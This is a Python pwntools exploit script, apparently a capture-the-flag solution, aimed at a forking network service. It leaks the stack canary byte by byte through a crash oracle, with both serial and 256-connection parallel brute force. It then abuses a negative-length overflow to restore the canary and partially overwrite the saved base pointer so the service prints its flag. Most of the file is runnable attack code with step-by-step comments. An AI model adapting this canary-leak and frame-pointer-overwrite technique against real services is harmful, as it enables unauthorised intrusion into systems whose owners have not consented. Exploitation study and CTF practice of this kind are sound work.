#!/usr/bin/python3

#import libraries
import sys
import random
import binascii
import pwn
#get some pwn stuff into global namespace
from pwn import p64, p8, sleep
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
pwn.context.log_level = 'error'

#assign host and port to connect to
host = "hacky2"
port = 13713
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


#If this is set to true, canary will be retrieved automatically
#Else the hardcoded value is used
retrieve_stack_canary = False
#The following 3 variables are conditional on the above variable being set to true
#If set to true 256 parallel connections will be used to obatain canary (faster)
#Else we wil wait for the result of each attempt before opening the next connection
parallel_retrieval = True
#How long should we wait initially to check if connections are ready?
initial_timeout = 0.1
#By what factor should the timeout be increased if we tried again and nothing changed?
exponential_timeout_multiplier = 1.5

#Should we start iterating at a fixed or a random byte for the partial override?
randomize_rbp_modifier_initval = False



#This is where the exploit lives
def exploit():

    #Due to the nature this task is set up, we are able to leak the canary using an oracle attack.
    #Since the main vuln process just keeps running and we're only connecting to forks, the stack 
    #  canary is the same each time we connect.
    #Hence we can leak the canary step by step, by partially overriding it and checking wether we 
    #  successfully return or not. Once this is done we can simply hardcode the canary.
    #A more indepth explanation of how this is done can be found in the get_stack_canary function 
    #  below (see line 162 onwards).

    #This decides wether the stack canary is retrieved anew or wether we use the hardcoded one.
    #The stack canary will stay the same as long as the main process keeps running, but will 
    #  change once its restarted.
    if retrieve_stack_canary == True:
        if parallel_retrieval == True:
            stack_canary = get_stack_canary_parallel()
        else:
            stack_canary = get_stack_canary()
    else:
        stack_canary = b"\x00\x16'\xa7,\xf7\xb4\xb0"

    #This decides wether we use a specific constant to override the base pointer and rely on ASLR 
    #  for proper randomization or if we randomize bits five to eight. Only a certain range of 
    #  values works the way we need it to. Randomization of this value will sometimes cause us to 
    #  hit outside this range, but it may help if this range changes (e.g. on server reboot).
    #We still keep iterating throgh all viable options if this doesn't hit on the first try. This 
    #  just modifies the initial value where we start iterating.
    if randomize_rbp_modifier_initval == True:
        rbp_modifier_initval = random.randrange(0x000, 0x100, 0x10)
    else:
        rbp_modifier_initval = 0x80

    print("Settings:")
    print(f"(-) Using Stack Canary {int.from_bytes(stack_canary, 'little'):#0{0}18x} ({'computed with oracle' if retrieve_stack_canary == True else 'hardcoded'}).")
    print(f"(-) Initially overriding lower base frame pointer byte with {rbp_modifier_initval:#0{0}4x} ({'randomized' if randomize_rbp_modifier_initval == True else 'hardcoded'}).")

    print("Initiating Exploit:")

    #At this point we have already leaked the canary. (See function get_stack_canary() for more.)
    #Our goal is to perform a partial override of the stack canary, which is only possible since  
    #  we can use the leaked canary to the canary on the stack with itself. Otherwise we wouldn't 
    #  be able to reach the base pointer undetected.
    #Partially overriding the base pointer basically shifts the stack by at most 15 addresses and 
    #  thus ensures that r no longer contains the random value but some predictable number that we 
    #  provide to it via get_num.
    for i in range(0x000, 0x100, 0x10):

        rbp_modifier = (rbp_modifier_initval + i) & 0xFF

        print("(-) Connecting.")
        proc = pwn.remote(host,port,fam="ipv4")

        print("(-) Sending exploit strings.")

        #Dealing with the "What is your name?" prompt:
        #
        #First we trigger an overflow. For this we enter a negative number. This circumvents the 
        #  size comparison, since the number is read as a signed integer but is then passed to the 
        #  recv function, which interprets it as an unsigned number (size_t).
        tmp_res = proc.readline()
        tmp_res = proc.readuntil(b": \x1b[33m")
        proc.write(b"-1")
        #Note that in this first case the buffer is located within the handle function. Hence any 
        #  modification we make to the base pointer here would only trigger after the equality of 
        #  r and the return value of get_num has been checked.
        #Yet, we still do something useful here, by controlling the values the variables within 
        #  handle can take on after shiftig the stack frame.
        #Specifically we want r to point to a controlled value (0) and need the socket to point 
        #  to the correct file descriptor (4) for the output to work. Hence (taking stack 
        #  allignment into account) we write those values to the stack a bunchof times.
        #Technically writing them only once would be sufficient, but by writing them multiple 
        #  we create the above mentioned corridor of valid offsets, which may come in handy 
        #  if something changes (e.g. on server reboot) and offset randomization on our part is 
        #  switched on.
        tmp_res = proc.readuntil(b": \x1b[33m")
        proc.write(8*(p64(0) + p64(0x400000000)))
        tmp_res = proc.readuntil(b": \x1b[33m")

        #Dealing with the prompt for the value of r:
        #
        #We once again trigger the overflow the same way.
        proc.write(b"-1")
        tmp_res = proc.readuntil(b": \x1b[33m")
        #Finally we can actually perform the override we talked so much about.
        #This time we are no longer writing to a buffer within the stackframe of handle, but 
        #  within the stackframe of get_num. This allows us to trigger the effects of the override 
        #  before reaching the comparison of r and our return value.
        #First we override the 17*8 byte of stuff between the beginning of our buffer and the 
        #  canary. Then we override the canary with the leaked value. Finally wie override the 
        #  lowest byte of the base frame pointer.
        #Since this value is popped into rbp before returning, and most local variables on the 
        #  stack are referenced relative to the base frame pointer, we achieved the shift we aimed 
        #  for.
        proc.write(17*p64(0) + stack_canary + p8(rbp_modifier))

        #Since surpassing the if condition and keeping the print statement intact in the process 
        #  is all it takes to get the flag, all that's left to do is actually retrieve it (and 
        #  try again if it didn't work).
        print("(-) Trying to retrieve flag.")
        try:
            tmp_res = proc.readuntil(b"\x1b[36mHere is your prize: ")
            flag = proc.readline().decode()
            if 'flag' in flag:
                print("(+) Successfully retrieved flag")
                print(flag + "\033[0m")
                proc.close()
                return
            else:
                print(f"(X) Tried base pointer modifier {rbp_modifier:x}. Didn't work. Continuing...")
                proc.close()
                continue
        except EOFError:
            print(f"(X) Tried base pointer modifier {rbp_modifier:x}. Didn't work. Continuing...")
            proc.close()
            continue

    print("Hmm, we've tried everything. That shouldn't happen...")
    print("Is the canary correct?")
    return



#This is where we actually retrieve the stack canary using an oracle attack:
#  In short we leverage the continuous execution of the socket handler, in order to iteratively 
#  bruteforce the stack canary one byte at a time using metainformation about wether or not 
#  a crash occurs on a specific partial override.
def get_stack_canary():

    #We need to input 136 bytes of data before reaching the stack canary from our buffer.
    base_input_str = 136*b"A"
    #The first lowest byte of the canary is always NULL, so we don't need to bruteforce that.
    #In each iteration this variable contains the part of the canary we already know.
    stack_canary = b"\x00"

    found = False
    while not found:
        #Starting at the second lowest byte we bruteforce each bytes value in the 8-byte canary.
        for j in range(1,8):
            found = False
            print(f"Stack Canary Generation Round #{j}:")
            print(f"(-) iterating potential stack carnaries starting with {binascii.hexlify(stack_canary).decode()}")
            print( "    [", end='')
            #We iterate over each of the 256 potential values of the lowest yet-to-be-determined 
            #  byte of the canary (=> 7*(256/2) = 896 connections to be expected on average in 
            #  order to determine the full canary).
            for i in range(0x00,0x100):
                #Each iteration we reconnect to the server.
                #Since the socket handler keeps running across connections, its canary won't change.
                #Additionally its children (created with fork() to handle individual connections) 
                #  inherit the canary value as well.
                proc = pwn.remote(host,port,fam="ipv4")
                print(f"{i:{0}2x}", end='')
                #The first two inputs can be basically arbitrary.
                #We don't need an overflow here.
                proc.readuntil(b": \x1b[33m")
                proc.write(b"123")
                proc.readuntil(b": \x1b[33m")
                proc.write(b"not_my_name")
                #Only at the second input do we trigger the overflow also used in the second stage 
                #  of the exploit (see exploit() for more information).
                proc.readuntil(b": \x1b[33m")
                proc.write(b"-1")
                #We override everything up until the canary with arbitrary data, then write the 
                #  part of the canary we already know (which changes nothing), and finally write 
                #  the current iterations byte.
                #Now one of two cases can occur:
                # - Either we hit the correct value. In this case the canary remains unchanged and 
                #   we will get the usual response we would expect if we only overwrote the rest 
                #   of the stack before the canary.
                # - Otherwise the canary won't pass the integrity check and the process will be 
                #   killed using SIGABRT. Importantly this does not affect the parent!
                #Hence we can easily deduce that we have found the correct value once we get the 
                #expected response.
                proc.readuntil(b": \x1b[33m")
                proc.write(base_input_str + stack_canary + i.to_bytes(1,'little'))
                try:
                    proc.readline()
                    found = True
                    stack_canary += i.to_bytes(1,'little')
                    print(f"\033[2D\033[1;32m{i:{0}2x}\033[0m]")
                    print("(-) updated stack canary state: ", end='')
                    print(stack_canary)
                    proc.close()
                    break
                except EOFError:
                    print(f"\033[2D\033[31m{i:{0}2x}\033[0m, ", end='')
                    continue
            #If we didn't get a response for some other reason in the "correct" case, we simply retry.
            if found != True:
                print("\033[2D]\033[0m")
                print("Something went wrong determining the stack canary. Retrying...")
                stack_canary = b"\x00"
                break

    #If we came this far we've found the correct canary.
    #This canary will stay the same until the socket handler itself is restarted.
    print("Retrieved Stack Canary: ", end='')
    print(stack_canary)
    print("")
    return stack_canary



#This will in general be faster, but only works if 256 connections can be maintained at once.
#The endresult is the leaked stack canary for both get_stack_canary and get_stack_canary_parallel.
def get_stack_canary_parallel():

    base_input_str = 136*b"A"
    stack_canary = b"\x00"

    for j in range(1,8):
        print(f"Stack Canary Generation Round #{j}:")

        print(f"(-) initializing connection array")
        proc_arr = [pwn.remote(host,port,fam="ipv4") for i in range(0x00,0x100)]
        connections_ready = 0
        connections_ready_prev = 0
        connection_setup_timeout = 0.1
        while connections_ready < len(proc_arr):
            connections_ready = 0
            print(f"    --> checking connections after timeout {connection_setup_timeout:.3g} s")
            sleep(connection_setup_timeout)
            for i in range(0x00,0x100):
                if not proc_arr[i].can_recv():
                    connection_ready = False
                    proc_arr[i].close()
                    proc_arr[i] = pwn.remote(host, port, fam='ipv4')
                else:
                    connections_ready += 1
            print(f"        {connections_ready} of {len(proc_arr)} ready")
            if connections_ready == connections_ready_prev:
                connection_setup_timeout *= exponential_timeout_multiplier
            connections_ready_prev = connections_ready
                    

        print(f"(-) sending test data for stack canary modification")
        print("    --> reading prompt 1:    ", end='')
        for i in range(0x00,0x100):
            print(f"\033[3D\033[31m{i:{0}2x}\033[0m,", end='')
            proc_arr[i].readuntil(b": \x1b[33m")
            proc_arr[i].write(b"123")
        print(f"\033[3D\033[1;32mdone\033[0m")
        print( "    --> reading prompt 2:    ", end='')
        for i in range(0x00,0x100):
            print(f"\033[3D\033[31m{i:{0}2x}\033[0m,", end='')
            proc_arr[i].readuntil(b": \x1b[33m")
            proc_arr[i].write(b"not_my_name")
        print(f"\033[3D\033[1;32mdone\033[0m")
        print( "    --> reading prompt 3:    ", end='')
        for i in range(0x00,0x100):
            print(f"\033[3D\033[31m{i:{0}2x}\033[0m,", end='')
            proc_arr[i].readuntil(b": \x1b[33m")
            proc_arr[i].write(b"-1")
        print(f"\033[3D\033[1;32mdone\033[0m")
        print( "    --> reading prompt 4:    ", end='')
        for i in range(0x00,0x100):
            print(f"\033[3D\033[31m{i:{0}2x}\033[0m,", end='')
            proc_arr[i].readuntil(b": \x1b[33m")
            proc_arr[i].write(base_input_str + stack_canary + i.to_bytes(1,'little'))
        print(f"\033[3D\033[1;32mdone\033[0m")

        connection_readability_check_timeout = 0.1
        print("(-) checking readability of connections for canary retrieval")
        while True:
            print(f"    --> timeout {connection_readability_check_timeout:.3g}s")
            readable_idx = -1
            for i in range(0x00,0x100):
                if proc_arr[i].can_recv():
                    readable_idx = i
            sleep(connection_readability_check_timeout)
            connection_readability_check_timeout *= exponential_timeout_multiplier
            if readable_idx > 0:
                print(f"(-) found readable connection: \033[32;1m{readable_idx}\033[0m")
                proc_arr[readable_idx].readline()
                stack_canary += readable_idx.to_bytes(1,'little')
                print("(-) updated stack canary state: ", end='')
                print(stack_canary)
                break

        print("(-) closing connections")
        for i in range(0x00,0x100):
            proc_arr[i].close()

        print("")

    print("Retrieved Stack Canary: ", end='')
    print(stack_canary)
    print("")
    return stack_canary


#Trigger the exploit when the script is executed.
exploit()



